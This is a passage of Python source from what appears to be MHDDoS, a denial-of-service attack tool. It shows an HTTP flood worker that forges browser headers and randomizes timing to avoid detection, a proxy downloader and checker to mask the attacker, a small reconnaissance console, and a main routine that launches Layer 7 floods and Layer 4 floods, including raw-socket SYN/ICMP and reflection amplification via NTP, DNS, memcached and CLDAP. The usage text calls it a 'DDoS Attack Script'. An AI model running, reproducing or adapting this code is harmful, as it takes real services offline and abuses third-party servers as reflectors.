                        parts.append("Sec-Fetch-Mode: %s\r\n" % rc(("navigate", "cors")))
                        parts.append("Sec-Fetch-Site: %s\r\n" % rc(("none", "same-origin")))
                        parts.append("Sec-Fetch-User: ?1\r\n")
                    if rc([True, False]):
                        parts.append("Upgrade-Insecure-Requests: 1\r\n")
                    if rc([True, False, False, False]):
                        parts.append("Referer: %s\r\n" % _killer_build_referrer(target_authority))
                    if fp.get("device_memory") and rc([True, False, False, False, False]):
                        parts.append("Device-Memory: %s\r\n" % rc(fp["device_memory"]))
                    if rc([True, False, False, False, False, False, False, False, False]):
                        parts.append("Priority: %s\r\n" % rc(("u=0, i", "u=1, i")))
                    parts.append("\r\n")
                    if method == "POST":
                        rand_data = PT.Random.rand_str(randint(32, 128))
                        parts.insert(-1, "Content-Type: application/json\r\n")
                        parts.insert(-1, "Content-Length: %d\r\n" % (len(rand_data) + 16))
                        parts.append('{"data":"%s"}' % rand_data)

                    payload = str.encode("".join(parts))
                    if not Tools.send(s, payload):
                        burst_ctrl.record_failure()
                        break
                    burst_ctrl.record_success()
                    sleep(expovariate(1.0 / 0.003))

            return_conn(s)
        except Exception:
            try:
                s.close()
            except Exception:
                pass

    refill_pool()
    burst_ctrl = _AdaptiveBurstController(max_workers)
    session_cache = {}
    base_delay = max(0.0005, 1.0 / max(max_workers, 1))

    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        while active:
            refill_pool()
            burst = burst_ctrl.get_burst_size()
            for _ in range(burst):
                pool.submit(_worker, get_connection, return_connection,
                            rpc, burst_ctrl, session_cache)
            sleep(base_delay * uniform(0.3, 1.0))
            for _ in range(max(burst // 3, 5)):
                pool.submit(_worker, get_connection, return_connection,
                            rpc, burst_ctrl, session_cache)
            sleep(base_delay * uniform(1.5, 4.0))
            if len(session_cache) > max_workers * 2:
                session_cache.clear()


class ProxyManager:

    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
                providrs))
        proxes: Set[Proxy] = set()

        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = f"{gethostname()}@MHTools:~#"

        while 1:
            cmd = input(cons + " ").strip()
            if not cmd: continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue

            if {cmd} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                exit(-1)

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & ToolsConsole.METHODS:
                print(f"{cmd} command not found")
                continue

            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)

                    while True:
                        sleep(1)

                        od = ld
                        ld = net_io_counters(pernic=False)

                        t = [(last - now) for now, last in zip(od, ld)]

                        logger.info(
                            ("Bytes Sent %s\n"
                             "Bytes Received %s\n"
                             "Packets Sent %s\n"
                             "Packets Received %s\n"
                             "ErrIn %s\n"
                             "ErrOut %s\n"
                             "DropIn %s\n"
                             "DropOut %s\n"
                             "Cpu Usage %s\n"
                             "Memory %s\n") %
                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),
                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),
                             t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
                             str(virtual_memory().percent) + "%"))
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue

            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f'{cons}give-me-ipaddress# ')
                        if not domain: continue
                        if domain.upper() == "BACK": break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                            exit(-1)
                        if "/" not in domain: continue
                        logger.info("please wait ...")

                        with get(domain, timeout=20) as r:
                            logger.info(('status_code: %d\n'
                                         'status: %s') %
                                        (r.status_code, "ONLINE"
                                        if r.status_code <= 500 else "OFFLINE"))

            if cmd == "INFO":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.info(domain)

                    if not info["success"]:
                        print("Error!")
                        continue

                    logger.info(("Country: %s\n"
                                 "City: %s\n"
                                 "Org: %s\n"
                                 "Isp: %s\n"
                                 "Region: %s\n") %
                                (info["country"], info["city"], info["org"],
                                 info["isp"], info["region"]))

            if cmd == "TSSRV":
                while True:
                    domain = input(f'{cons}give-me-domain# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.ts_srv(domain)
                    logger.info(f"TCP: {(info['_tsdns._tcp.'])}\n")
                    logger.info(f"UDP: {(info['_ts3._udp.'])}\n")

            if cmd == "PING":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                        exit(-1)

                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]

                    logger.info("please wait ...")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(('Address: %s\n'
                                 'Ping: %d\n'
                                 'Aceepted Packets: %d/%d\n'
                                 'status: %s\n') %
                                (r.address, r.avg_rtt, r.packets_received,
                                 r.packets_sent,
                                 "ONLINE" if r.is_alive else "OFFLINE"))

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def usage():
        print((
                  '* MHDDoS - DDoS Attack Script With %d Methods\n'
                  'Note: If the Proxy list is empty, The attack will run without proxies\n'
                  '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                  '      Proxy Type 0 = All in config.json\n'
                  '      SocksTypes:\n'
                  '         - 6 = RANDOM\n'
                  '         - 5 = SOCKS5\n'
                  '         - 4 = SOCKS4\n'
                  '         - 1 = HTTP\n'
                  '         - 0 = ALL\n'
                  ' > Methods:\n'
                  ' - Layer4\n'
                  ' | %s | %d Methods\n'
                  ' - Layer7\n'
                  ' | %s | %d Methods\n'
                  ' - Tools\n'
                  ' | %s | %d Methods\n'
                  ' - Others\n'
                  ' | %s | %d Methods\n'
                  ' - All %d Methods\n'
                  '\n'
                  'Example:\n'
                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                  ' Amplification)>\n') %
              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
               ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
               ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               argv[0], argv[0], argv[0], argv[0]))

    # noinspection PyBroadException
    @staticmethod
    def ts_srv(domain):
        records = ['_ts3._udp.', '_tsdns._tcp.']
        DnsResolver = resolver.Resolver()
        DnsResolver.timeout = 1
        DnsResolver.lifetime = 1
        Info = {}
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, 'SRV')
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(
                        srv.port)
            except:
                Info[rec] = 'Not found'

        return Info

    # noinspection PyUnreachableCode
    @staticmethod
    def info(domain):
        with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
            return s.json()
        return {"success": False}


def handleProxyList(con, proxy_li, proxy_ty, url=None):
    if proxy_ty not in {4, 5, 1, 0, 6}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
    if proxy_ty == 6:
        proxy_ty = randchoice([4, 5, 1])
    if not proxy_li.exists():
        logger.warning(
            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
            )
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=5, threads=threads,
                url=url.human_repr() if url else "http://httpbin.org/get",
            )

            if not Proxies:
                exit(
                    "Proxy Check failed, Your network may be the problem"
                    " | The target may not be available."
                )
            stringBuilder = ""
            for proxy in Proxies:
                stringBuilder += (proxy.__str__() + "\n")
            wr.write(stringBuilder)

    proxies = ProxyUtiles.readFromFile(proxy_li)
    if proxies:
        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
    else:
        logger.info(
            f"{bcolors.WARNING}Empty Proxy File, running flood without proxy{bcolors.RESET}")
        proxies = None

    return proxies


if __name__ == '__main__':
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                ToolsConsole.runConsole()
            if one == "STOP":
                ToolsConsole.stop()

            method = one
            host = None
            port = None
            url = None
            event = Event()
            event.clear()
            target = None
            urlraw = argv[2].strip()
            if not urlraw.startswith("http"):
                urlraw = "http://" + urlraw

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found %s" %
                     ", ".join(Methods.ALL_METHODS))

            if method in Methods.LAYER7_METHODS:
                url = URL(urlraw)
                host = url.host

                if method != "TOR":
                    try:
                        host = gethostbyname(url.host)
                    except Exception as e:
                        exit('Cannot resolve hostname ', url.host, str(e))

                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])
                proxy_ty = int(argv[3].strip())
                proxy_li = Path(__dir__ / "files/proxies/" /
                                argv[5].strip())
                useragent_li = Path(__dir__ / "files/useragent.txt")
                referers_li = Path(__dir__ / "files/referers.txt")
                bombardier_path = Path.home() / "go/bin/bombardier"
                proxies: Any = set()

                if method == "BOMB":
                    assert (
                            bombardier_path.exists()
                            or bombardier_path.with_suffix('.exe').exists()
                    ), (
                        "Install bombardier: "
                        "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
                    )

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                if not useragent_li.exists():
                    exit("The Useragent file doesn't exist ")
                if not referers_li.exists():
                    exit("The Referer file doesn't exist ")

                uagents = set(a.strip()
                              for a in useragent_li.open("r+").readlines())
                referers = set(a.strip()
                               for a in referers_li.open("r+").readlines())

                if not uagents: exit("Empty Useragent File ")
                if not referers: exit("Empty Referer File ")

                if threads > 1000:
                    logger.warning("Thread is higher than 1000")
                if rpc > 100:
                    logger.warning(
                        "RPC (Request Pre Connection) is higher than 100")

                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                for thread_id in range(threads):
                    HttpFlood(thread_id, url, host, method, rpc, event,
                              uagents, referers, proxies).start()

            if method in Methods.LAYER4_METHODS:
                target = URL(urlraw)

                port = target.port
                target = target.host

                try:
                    target = gethostbyname(target)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)

                if port > 65535 or port < 1:
                    exit("Invalid Port [Min: 1 / Max: 65535] ")

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                        not ToolsConsole.checkRawSocket():
                    exit("Cannot Create Raw Socket")

                if method in Methods.LAYER4_AMP:
                    logger.warning("this method need spoofable servers please check")
                    logger.warning("https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack")

                threads = int(argv[3])
                timer = int(argv[4])
                proxies = None
                ref = None

                if not port:
                    logger.warning("Port Not Selected, Set To Default: 80")
                    port = 80

                if method in {"SYN", "ICMP"}:
                    __ip__ = __ip__

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive:
                        refl_li = Path(__dir__ / "files" / argfive)
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                            if not refl_li.exists():
                                exit("The reflector file doesn't exist")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                            ref = set(a.strip()
                                      for a in Tools.IP.findall(refl_li.open("r").read()))
                            if not ref: exit("Empty Reflector File ")

                        elif argfive.isdigit() and len(argv) >= 7:
                            if len(argv) == 8:
                                logger.setLevel("DEBUG")
                            proxy_ty = int(argfive)
                            proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
                            proxies = handleProxyList(con, proxy_li, proxy_ty)
                            if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                exit("this method cannot use for layer4 proxy")

                        else:
                            logger.setLevel("DEBUG")
                
                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                
                if method == "MCBOT":
                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                        Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
                        Tools.send(s, Minecraft.data(b'\x00'))

                        protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                        protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
                        
                        if 47 < protocolid > 758:
                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]

                for _ in range(threads):
                    Layer4((target, port), ref, method, event,
                           proxies, protocolid).start()

            logger.info(
                f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
                % (target or url.host, method, timer, threads))
            event.set()
            ts = time()
            while time() < ts + timer:
                logger.debug(
                    f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
                    (target or url.host,
                     port or (url.port or 80),
                     method,
                     Tools.humanformat(int(REQUESTS_SENT)),
                     Tools.humanbytes(int(BYTES_SEND)),
                     round((time() - ts) / timer * 100, 2)))
                REQUESTS_SENT.set(0)
                BYTES_SEND.set(0)
                sleep(1)

            event.clear()
            exit()

        ToolsConsole.usage()
